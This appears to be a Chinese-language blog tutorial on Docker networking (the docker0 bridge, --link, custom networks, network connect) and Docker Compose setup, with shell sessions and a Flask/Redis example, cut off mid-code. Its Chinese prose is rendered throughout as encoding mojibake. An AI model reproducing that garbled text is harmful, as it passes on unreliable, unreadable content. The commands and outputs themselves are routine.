<p>ç»“è®ºï¼štomcat1å’Œtomcat2å…±ç”¨ä¸€ä¸ªè·¯ç”±å™¨ã€‚æ˜¯çš„ï¼Œä»–ä»¬ä½¿ç”¨çš„ä¸€ä¸ªï¼Œå°±æ˜¯docker0ã€‚ä»»ä½•ä¸€ä¸ªå®¹å™¨å¯åŠ¨</p>
<p>é»˜è®¤éƒ½æ˜¯docker0ç½‘ç»œã€‚</p>
<p>dockeré»˜è®¤ä¼šç»™å®¹å™¨åˆ†é…ä¸€ä¸ªå¯ç”¨ipã€‚</p>
<blockquote>
<p>å°ç»“</p>
</blockquote>
<p>Dockerä½¿ç”¨Linuxæ¡¥æ¥ï¼Œåœ¨å®¿ä¸»æœºè™šæ‹Ÿä¸€ä¸ªDockerå®¹å™¨ç½‘æ¡¥(docker0)ï¼ŒDockerå¯åŠ¨ä¸€ä¸ªå®¹å™¨æ—¶ä¼šæ ¹æ®</p>
<p>Dockerç½‘æ¡¥çš„ç½‘æ®µåˆ†é…ç»™å®¹å™¨ä¸€ä¸ªIPåœ°å€ï¼Œç§°ä¸ºContainer-IPï¼ŒåŒæ—¶Dockerç½‘æ¡¥æ˜¯æ¯ä¸ªå®¹å™¨çš„é»˜è®¤ç½‘</p>
<p>å…³ã€‚å› ä¸ºåœ¨åŒä¸€å®¿ä¸»æœºå†…çš„å®¹å™¨éƒ½æ¥å…¥åŒä¸€ä¸ªç½‘æ¡¥ï¼Œè¿™æ ·å®¹å™¨ä¹‹é—´å°±èƒ½å¤Ÿé€šè¿‡å®¹å™¨çš„Container-IPç›´æ¥</p>
<p>é€šä¿¡ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-25/b5514df66fdbaa3587500b1413900596--f81e--image-20240925185950744.png" alt="image-20240925185950744"></p>
<p>Dockerå®¹å™¨ç½‘ç»œå°±å¾ˆå¥½çš„åˆ©ç”¨äº†Linuxè™šæ‹Ÿç½‘ç»œæŠ€æœ¯ï¼Œåœ¨æœ¬åœ°ä¸»æœºå’Œå®¹å™¨å†…åˆ†åˆ«åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæ¥å£ï¼Œå¹¶</p>
<p>è®©ä»–ä»¬å½¼æ­¤è”é€šï¼ˆè¿™æ ·ä¸€å¯¹æ¥å£å«veth pairï¼‰ï¼›</p>
<p>Dockerä¸­çš„ç½‘ç»œæ¥å£é»˜è®¤éƒ½æ˜¯è™šæ‹Ÿçš„æ¥å£ã€‚è™šæ‹Ÿæ¥å£çš„ä¼˜åŠ¿å°±æ˜¯è½¬å‘æ•ˆç‡æé«˜ï¼ˆå› ä¸ºLinuxæ˜¯åœ¨å†…æ ¸ä¸­</p>
<p>è¿›è¡Œæ•°æ®çš„å¤åˆ¶æ¥å®ç°è™šæ‹Ÿæ¥å£ä¹‹é—´çš„æ•°æ®è½¬å‘ï¼Œæ— éœ€é€šè¿‡å¤–éƒ¨çš„ç½‘ç»œè®¾å¤‡äº¤æ¢ï¼‰ï¼Œå¯¹äºæœ¬åœ°ç³»ç»Ÿå’Œå®¹</p>
<p>å™¨ç³»ç»Ÿæ¥è¯´ï¼Œè™šæ‹Ÿæ¥å£è·Ÿä¸€ä¸ªæ­£å¸¸çš„ä»¥å¤ªç½‘å¡ç›¸æ¯”å¹¶æ²¡æœ‰åŒºåˆ«ï¼Œåªæ˜¯ä»–çš„é€Ÿåº¦å¿«å¾ˆå¤šã€‚</p>
<h2 id="2ã€â€“link"><a href="#2ã€â€“link" class="headerlink" title="2ã€â€“link"></a>2ã€â€“link</h2><p>æ€è€ƒä¸€ä¸ªåœºæ™¯ï¼Œæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªå¾®æœåŠ¡ï¼Œæ•°æ®åº“è¿æ¥åœ°å€åŸæ¥æ˜¯ä½¿ç”¨ipçš„ï¼Œå¦‚æœipå˜åŒ–å°±ä¸è¡Œäº†ï¼Œé‚£æˆ‘ä»¬</p>
<p>èƒ½ä¸èƒ½ä½¿ç”¨æœåŠ¡åè®¿é—®å‘¢ï¼Ÿ</p>
<p>jdbc:mysql:&#x2F;&#x2F;mysql:3306ï¼Œè¿™æ ·çš„è¯å“ªæ€•mysqlé‡å¯ï¼Œæˆ‘ä»¬ä¹Ÿä¸éœ€è¦ä¿®æ”¹é…ç½®äº†ï¼dockeræä¾›äº† â€“link</p>
<p>çš„æ“ä½œï¼</p>
<blockquote>
<p>åŸç†</p>
</blockquote>
<p>å•çº¯æ˜¯ä¿®æ”¹äº†hostæ–‡ä»¶ä½¿å®¹å™¨åæŒ‡å‘äº†å¯¹åº”çš„ipåœ°å€</p>
<p>ä»è€Œå¯ä»¥ç›´æ¥è®¿é—®å¯¹åº”çš„å®¹å™¨å</p>
<p>â€“linkæ—©éƒ½è¿‡æ—¶äº†ï¼Œæˆ‘ä»¬ä¸æ¨èä½¿ç”¨ï¼æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰ç½‘ç»œçš„æ–¹å¼</p>
<h2 id="3ã€è‡ªå®šä¹‰ç½‘ç»œ"><a href="#3ã€è‡ªå®šä¹‰ç½‘ç»œ" class="headerlink" title="3ã€è‡ªå®šä¹‰ç½‘ç»œ"></a>3ã€è‡ªå®šä¹‰ç½‘ç»œ</h2><blockquote>
<p>åŸºæœ¬å‘½ä»¤æŸ¥çœ‹</p>
</blockquote>
<p>å‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network --help</span></span><br><span class="line"></span><br><span class="line">Usage:  docker network COMMAND</span><br><span class="line"></span><br><span class="line">Manage networks</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  connect     Connect a container to a network</span><br><span class="line">  create      Create a network</span><br><span class="line">  disconnect  Disconnect a container from a network</span><br><span class="line">  inspect     Display detailed information on one or more networks</span><br><span class="line">  <span class="built_in">ls</span>          List networks</span><br><span class="line">  prune       Remove all unused networks</span><br><span class="line">  <span class="built_in">rm</span>          Remove one or more networks</span><br><span class="line"></span><br><span class="line">Run <span class="string">&#x27;docker network COMMAND --help&#x27;</span> <span class="keyword">for</span> more information on a <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure>

<p><strong>æŸ¥çœ‹æ‰€æœ‰ç½‘ç»œ</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network ls</span></span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">6ebce816547d   bridge    bridge    <span class="built_in">local</span></span><br><span class="line">05ae65613256   host      host      <span class="built_in">local</span></span><br><span class="line">e0876b8be916   none      null      <span class="built_in">local</span></span><br></pre></td></tr></table></figure>

<p>æ‰€æœ‰ç½‘ç»œæ¨¡å¼</p>
<table>
<thead>
<tr>
<th>ç½‘ç»œæ¨¡å¼</th>
<th>é…ç½®</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>bridgeæ¨¡å¼</td>
<td>â€“net&#x3D;bridge</td>
<td>é»˜è®¤å€¼ï¼Œåœ¨Dockerç½‘æ¡¥docker0ä¸Šä¸ºå®¹å™¨åˆ›å»ºæ–°çš„ç½‘ç»œæ ˆ</td>
</tr>
<tr>
<td>noneæ¨¡å¼</td>
<td>â€“net&#x3D;none</td>
<td>ä¸é…ç½®ç½‘ç»œï¼Œç”¨æˆ·å¯ä»¥ç¨åè¿›å…¥å®¹å™¨ï¼Œè‡ªè¡Œé…ç½®</td>
</tr>
<tr>
<td>containeræ¨¡å¼</td>
<td>â€“net&#x3D;container:name&#x2F;id</td>
<td>å®¹å™¨å’Œå¦å¤–ä¸€ä¸ªå®¹å™¨å…±äº«Network namespaceã€‚kubernetesä¸­çš„podå°±æ˜¯å¤šä¸ªå®¹å™¨å…±äº«ä¸€ä¸ªNetwork namespace</td>
</tr>
<tr>
<td>hostæ¨¡å¼</td>
<td>â€“net&#x3D;host</td>
<td>å®¹å™¨å’Œå®¿ä¸»æœºå…±äº«Network namespace</td>
</tr>
<tr>
<td>ç”¨æˆ·è‡ªå®šä¹‰æ¨¡å¼</td>
<td>â€“net&#x3D;è‡ªå®šä¹‰ç½‘ç»œ</td>
<td>ç”¨æˆ·è‡ªå·±ä½¿ç”¨networkç›¸å…³å‘½ä»¤å®šä¹‰ç½‘ç»œï¼Œåˆ›å»ºå®¹å™¨çš„æ—¶å€™å¯ä»¥æŒ‡å®šä¸ºè‡ªå·±å®šä¹‰çš„ç½‘ç»œ</td>
</tr>
</tbody></table>
<p><strong>æŸ¥çœ‹ä¸€ä¸ªå…·ä½“çš„ç½‘ç»œçš„è¯¦æƒ…</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network inspect 6ebce816547d</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;bridge&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Id&quot;</span>: <span class="string">&quot;6ebce816547d589207a8b545c4a79bb1f3f0f4219a3794b08e2669c97f2c52f8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Created&quot;</span>: <span class="string">&quot;2024-09-21T20:29:18.36204997+08:00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Scope&quot;</span>: <span class="string">&quot;local&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Driver&quot;</span>: <span class="string">&quot;bridge&quot;</span>,</span><br><span class="line">        <span class="string">&quot;EnableIPv6&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;IPAM&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Driver&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Options&quot;</span>: null,</span><br><span class="line">            <span class="string">&quot;Config&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;Subnet&quot;</span>: <span class="string">&quot;172.17.0.0/16&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Gateway&quot;</span>: <span class="string">&quot;172.17.0.1&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;Internal&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Attachable&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Ingress&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;ConfigFrom&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Network&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;ConfigOnly&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Containers&quot;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;Options&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;com.docker.network.bridge.default_bridge&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.docker.network.bridge.enable_icc&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.docker.network.bridge.enable_ip_masquerade&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.docker.network.bridge.host_binding_ipv4&quot;</span>: <span class="string">&quot;0.0.0.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.docker.network.bridge.name&quot;</span>: <span class="string">&quot;docker0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;com.docker.network.driver.mtu&quot;</span>: <span class="string">&quot;1500&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;Labels&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>æ‹“å±•ï¼š</p>
<ul>
<li>172.17.0.0&#x2F;16 æ˜¯ä¸€ä¸ª CIDR åœ°å€ï¼Œå…¶ä¸­ &#x2F;16 è¡¨ç¤ºå­ç½‘æ©ç çš„ä½æ•°ï¼Œå³ 255.255.0.0ã€‚è¿™ä¸ªåœ°å€èŒƒå›´å†…çš„ IP åœ°å€æ•°é‡æ˜¯ 2^16 - 2 &#x3D; 65534ã€‚å…¶ä¸­ï¼Œ2^16 è¡¨ç¤ºè¯¥åœ°å€èŒƒå›´å†…çš„ IP åœ°å€æ€»æ•°ï¼Œè€Œå‡å» 2 æ˜¯å› ä¸ºè¯¥åœ°å€èŒƒå›´å†…çš„ç¬¬ä¸€ä¸ª IP åœ°å€æ˜¯ç½‘ç»œåœ°å€ï¼Œæœ€åä¸€ä¸ª IP åœ°å€æ˜¯å¹¿æ’­åœ°å€ï¼Œä¸èƒ½ä½¿ç”¨</li>
<li>172.17.0.0&#x2F;24 æ˜¯ä¸€ä¸ª CIDR åœ°å€ï¼Œå…¶ä¸­ &#x2F;24 è¡¨ç¤ºå­ç½‘æ©ç çš„ä½æ•°ï¼Œå³ 255.255.255.0ã€‚è¿™ä¸ªåœ°å€èŒƒå›´å†…çš„ IP åœ°å€æ•°é‡æ˜¯ 2^8 - 2 &#x3D; 254ã€‚å…¶ä¸­ï¼Œ2^8 è¡¨ç¤ºè¯¥åœ°å€èŒƒå›´å†…çš„ IP åœ°å€æ€»æ•°ï¼Œè€Œå‡å» 2 æ˜¯å› ä¸ºè¯¥åœ°å€èŒƒå›´å†…çš„ç¬¬ä¸€ä¸ª IP åœ°å€æ˜¯ç½‘ç»œåœ°å€ï¼Œæœ€åä¸€ä¸ª IP åœ°å€æ˜¯å¹¿æ’­åœ°å€ï¼Œä¸èƒ½ä½¿ç”¨ã€‚</li>
</ul>
<blockquote>
<p>è‡ªå®šä¹‰ç½‘å¡</p>
</blockquote>
<ol>
<li><p>åˆ é™¤åŸæ¥çš„æ‰€æœ‰çš„å®¹å™¨ï¼ˆè¿™æ ·å¹²å‡€ä¸€ç‚¹ï¼‰</p>
<p>è¿™æ ·ç½‘ç»œå°±æ¢å¤æœ€åˆçš„æ ·å­äº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># ip addr</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 52:54:00:58:5e:1a brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp0s5</span><br><span class="line">    altname ens5</span><br><span class="line">    inet 10.0.16.10/22 metric 100 brd 10.0.19.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe58:5e1a/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span><br><span class="line">    <span class="built_in">link</span>/ether 02:42:99:03:57:1b brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:99ff:fe03:571b/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
</li>
<li><p>è‡ªå®šä¹‰ç½‘ç»œ</p>
<p>æŸ¥çœ‹å‘½ä»¤ä½¿ç”¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è‡ªå®šä¹‰ä¸€ä¸ªç½‘ç»œ</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network create --driver bridge --subnet 192.17.0.0/16 --gateway 192.17.0.1 mynet</span></span><br><span class="line">ecef3e6ceef718e93c001b8068e0c824086046e1e5196b050fab6ef65a8903b9</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network ls</span></span><br><span class="line">NETWORK ID     NAME      DRIVER    SCOPE</span><br><span class="line">6ebce816547d   bridge    bridge    <span class="built_in">local</span></span><br><span class="line">05ae65613256   host      host      <span class="built_in">local</span></span><br><span class="line">ecef3e6ceef7   mynet     bridge    <span class="built_in">local</span></span><br><span class="line">e0876b8be916   none      null      <span class="built_in">local</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network inspect mynet</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;mynet&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Id&quot;</span>: <span class="string">&quot;ecef3e6ceef718e93c001b8068e0c824086046e1e5196b050fab6ef65a8903b9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Created&quot;</span>: <span class="string">&quot;2024-09-25T19:29:21.684869939+08:00&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Scope&quot;</span>: <span class="string">&quot;local&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Driver&quot;</span>: <span class="string">&quot;bridge&quot;</span>,</span><br><span class="line">        <span class="string">&quot;EnableIPv6&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;IPAM&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Driver&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Options&quot;</span>: &#123;&#125;,</span><br><span class="line">            <span class="string">&quot;Config&quot;</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">&quot;Subnet&quot;</span>: <span class="string">&quot;192.17.0.0/16&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Gateway&quot;</span>: <span class="string">&quot;192.17.0.1&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;Internal&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Attachable&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Ingress&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;ConfigFrom&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;Network&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;ConfigOnly&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Containers&quot;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;Options&quot;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&quot;Labels&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>åŸºäºè‡ªå®šä¹‰ç½‘ç»œå¯åŠ¨å®¹å™¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä½¿ç”¨è‡ªå®šä¹‰ç½‘ç»œ</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker run -d -P --name tomcat-net-1 --net mynet my-tomcat01:1.0</span></span><br><span class="line"><span class="comment"># å‘ç°å·²ç»æˆåŠŸä½¿ç”¨ä¸Š</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume/tomcat<span class="comment"># docker network inspect mynet</span></span><br><span class="line">&#125;,</span><br><span class="line">        <span class="string">&quot;ConfigOnly&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="string">&quot;Containers&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;6ccd4eceb20ec77000793369ee924106f698c236e48f53e082b0cbd830289b13&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Name&quot;</span>: <span class="string">&quot;tomcat-net-1&quot;</span>,</span><br><span class="line">                <span class="string">&quot;EndpointID&quot;</span>: <span class="string">&quot;cf8a18045268e43e29e3e7ae2315af57a58560860f8fe9ce64c5f015c599dc17&quot;</span>,</span><br><span class="line">                <span class="string">&quot;MacAddress&quot;</span>: <span class="string">&quot;02:42:c0:11:00:02&quot;</span>,</span><br><span class="line">                <span class="string">&quot;IPv4Address&quot;</span>: <span class="string">&quot;192.17.0.2/16&quot;</span>,</span><br><span class="line">                <span class="string">&quot;IPv6Address&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</li>
<li><p>å‘ç°ï¼Œæˆ‘ä»¬è‡ªå®šä¹‰çš„ç½‘ç»œdockeréƒ½å·²ç»å¸®æˆ‘ä»¬ç»´æŠ¤å¥½äº†å¯¹åº”çš„å…³ç³» </p>
<p>æ‰€ä»¥æˆ‘ä»¬å¹³æ—¶éƒ½å¯ä»¥è¿™æ ·ä½¿ç”¨ç½‘ç»œï¼Œä¸ä½¿ç”¨â€“linkæ•ˆæœä¸€æ ·ï¼Œæ‰€æœ‰ä¸œè¥¿å®æ—¶ç»´æŠ¤å¥½ï¼Œç›´æ¥åŸŸå ping é€šã€‚</p>
</li>
</ol>
<h2 id="4ã€ç½‘ç»œè¿é€š"><a href="#4ã€ç½‘ç»œè¿é€š" class="headerlink" title="4ã€ç½‘ç»œè¿é€š"></a>4ã€ç½‘ç»œè¿é€š</h2><ol>
<li><p>å¯åŠ¨ä¸¤ä¸ªå®¹å™¨ï¼ˆé»˜è®¤ï¼ŒåŸºäºdocker0çš„ç½‘ç»œï¼‰</p>
<p>å¯åŠ¨ä¸¤ä¸ªå®¹å™¨ï¼ˆé»˜è®¤ï¼ŒåŸºäºdocker0çš„ç½‘ç»œï¼‰</p>
</li>
<li><p>ä½¿ç”¨network connect å‘½ä»¤è¿æ¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># docker network connect mynet tomcat-1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>å†æ¬¡éªŒè¯ï¼Œé€šäº†</p>
</li>
<li><p>çœ‹ä¸€ä¸‹tomcat-1çš„ç½‘ç»œä¿¡æ¯(tomcat01æ‹¥æœ‰äº†åŒip)</p>
</li>
<li><p>å†çœ‹ä¸€ä¸‹mynetçš„ç½‘ç»œä¿¡æ¯</p>
</li>
</ol>
<p>ç»“è®ºï¼šå¦‚æœè¦è·¨ç½‘ç»œæ“ä½œåˆ«äººï¼Œå°±éœ€è¦ä½¿ç”¨ <code>docker network connect [OPTIONS] NETWORK CONTAINER</code> è¿æ¥</p>
<h1 id="åã€Docker-compose"><a href="#åã€Docker-compose" class="headerlink" title="åã€Docker compose"></a>åã€Docker compose</h1><p>Compose æ˜¯ç”¨äºå®šä¹‰å’Œè¿è¡Œå¤šå®¹å™¨ Docker åº”ç”¨ç¨‹åºçš„å·¥å…·ã€‚</p>
<p>é€šè¿‡ Composeï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ YML æ–‡ä»¶æ¥é…ç½®åº”ç”¨ç¨‹åºéœ€è¦çš„æ‰€æœ‰æœåŠ¡ã€‚ç„¶åï¼Œä½¿ç”¨ä¸€ä¸ªå‘½ä»¤ï¼Œå°±å¯ä»¥ä» YML æ–‡ä»¶é…ç½®ä¸­åˆ›å»ºå¹¶å¯åŠ¨æ‰€æœ‰æœåŠ¡ã€‚</p>
<p>Compose ä½¿ç”¨çš„ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<ul>
<li>ä½¿ç”¨ Dockerfile å®šä¹‰åº”ç”¨ç¨‹åºçš„ç¯å¢ƒ</li>
<li>ä½¿ç”¨ docker-compose.yml å®šä¹‰æ„æˆåº”ç”¨ç¨‹åºçš„æœåŠ¡ï¼Œè¿™æ ·å®ƒä»¬å¯ä»¥åœ¨éš”ç¦»ç¯å¢ƒä¸­ä¸€èµ·è¿è¡Œ</li>
<li>æœ€åï¼Œæ‰§è¡Œ docker-compose up å‘½ä»¤æ¥å¯åŠ¨å¹¶è¿è¡Œæ•´ä¸ªåº”ç”¨ç¨‹åº</li>
</ul>
<p>ä¸­æ–‡æ–‡æ¡£ï¼š<a href="http://www.dockerinfo.net/docker-compose-%e9%a1%b9%e7%9b%ae">http://www.dockerinfo.net/docker-compose-%e9%a1%b9%e7%9b%ae</a></p>
<p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.docker.com/compose/">https://docs.docker.com/compose/</a></p>
<blockquote>
<p>composeå®‰è£…  è¦æ³¨æ„å’ŒDockeråŒä¸€ä¸ªç‰ˆæœ¬</p>
</blockquote>
<blockquote>
<p>è¿™é‡Œæœ‰ç‹¬ç«‹ç‰ˆå’Œæ’ä»¶ç‰ˆä¸¤ç§ï¼ŒåŒºåˆ«æ„Ÿè§‰ä¸å¤§ï¼Œä¸»è¦å°±æ˜¯å‘½ä»¤çš„ä½¿ç”¨çš„ä¸€ç‚¹ç‚¹å·®åˆ«ï¼Œæˆ‘è¿™ä¸»è¦ä½¿ç”¨çš„æ˜¯ç‹¬ç«‹ç‰ˆ</p>
</blockquote>
<blockquote>
<p><strong>Compose ç‹¬ç«‹ç‰ˆ</strong></p>
<p>è¯·æ³¨æ„ï¼ŒCompose standalone ä½¿ç”¨<code>-compose</code>è¯­æ³• è€Œä¸æ˜¯å½“å‰æ ‡å‡†è¯­æ³•<code>compose</code>ã€‚<br>ä¾‹å¦‚ï¼Œ<code>docker-compose up</code>ä½¿ç”¨ Compose standalone æ—¶è¾“å…¥ ï¼Œè€Œä¸æ˜¯<code>docker compose up</code>ã€‚</p>
</blockquote>
<ol>
<li><p>è¦ä¸‹è½½å¹¶å®‰è£… Compose ç‹¬ç«‹ç‰ˆï¼Œè¯·è¿è¡Œï¼š</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -SL https://github.com/docker/compose/releases/download/v2.29.6/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>å°†å¯æ‰§è¡Œæƒé™åº”ç”¨äºå®‰è£…ç›®æ ‡è·¯å¾„ä¸­çš„ç‹¬ç«‹äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</p>
</li>
<li><p>ä½¿ç”¨ æµ‹è¯•å¹¶æ‰§è¡Œæ’°å†™å‘½ä»¤<code>docker-compose</code>ã€‚</p>
<blockquote>
<p><strong>æç¤º</strong></p>
<p>å¦‚æœå®‰è£…åå‘½ä»¤<code>docker-compose</code>å¤±è´¥ï¼Œè¯·æ£€æŸ¥æ‚¨çš„è·¯å¾„ã€‚æ‚¨è¿˜å¯ä»¥åˆ›å»ºæŒ‡å‘æˆ–è·¯å¾„ä¸­ä»»ä½•å…¶ä»–ç›®å½•çš„ç¬¦å·é“¾æ¥<code>/usr/bin</code>ã€‚ä¾‹å¦‚ï¼š</p>
<p>$ sudo ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose &#x2F;usr&#x2F;bin&#x2F;docker-compose</p>
</blockquote>
</li>
</ol>
<blockquote>
<p>composeä½¿ç”¨</p>
</blockquote>
<p>1ã€è®¾ç½®</p>
<ol>
<li><p>ä¸ºé¡¹ç›®åˆ›å»ºç›®å½•ï¼š</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">mkdir</span> composetest</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> composetest</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>åœ¨æ‚¨çš„é¡¹ç›®ç›®å½•ä¸­åˆ›å»ºä¸€ä¸ªåä¸ºçš„æ–‡ä»¶<code>app.py</code>å¹¶ç²˜è´´ä»¥ä¸‹ä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">cache = redis.Redis(host=<span class="string">&#x27;redis&#x27;</span>, port=<span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hit_count</span>():</span><br><span class="line">    retries = <span class="number">5</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> cache.incr(<span class="string">&#x27;hits&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> redis.exceptions.ConnectionError <span class="keyword">as</span> exc:</span><br><span class="line">            <span 